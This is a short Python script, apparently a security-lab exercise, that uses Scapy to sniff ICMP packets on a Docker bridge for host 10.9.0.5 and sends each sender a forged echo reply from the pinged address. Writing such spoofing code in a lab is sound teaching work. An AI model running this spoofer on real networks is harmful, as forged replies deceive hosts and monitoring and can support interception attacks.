#!/usr/bin/env python3
from scapy.all import *

# def print_pkt(pkt):
# 	pkt.show()

def spoof_pkt(pkt):
	src = pkt[IP].dst
	dst = pkt[IP].src
	a = IP(src=src,dst=dst,ttl=40)
	b = ICMP(type=0,id=pkt[ICMP].id, seq=pkt[ICMP].seq, code=0)
	raw = pkt[Raw]
	send(a/b/raw)

pkt = sniff(iface="br-e6512860ed72", 
			filter="icmp and host 10.9.0.5",
			prn=spoof_pkt)



